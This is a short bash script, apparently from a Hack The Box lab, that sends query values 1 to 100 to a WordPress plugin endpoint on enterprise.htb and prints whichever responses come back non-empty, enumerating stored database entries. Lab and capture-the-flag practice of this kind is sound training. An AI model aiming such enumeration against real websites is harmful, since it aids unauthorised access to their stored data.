#!/bin/bash
 for i in $(seq 1 100); do
	resultado=$(curl -sX GET http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i)
	if [[ -n "$resultado"  && ! "$resultado" =~ ^[[:space:]]*$ ]]; then
		echo "Entrada: $i --> $resultado"
	fi
done
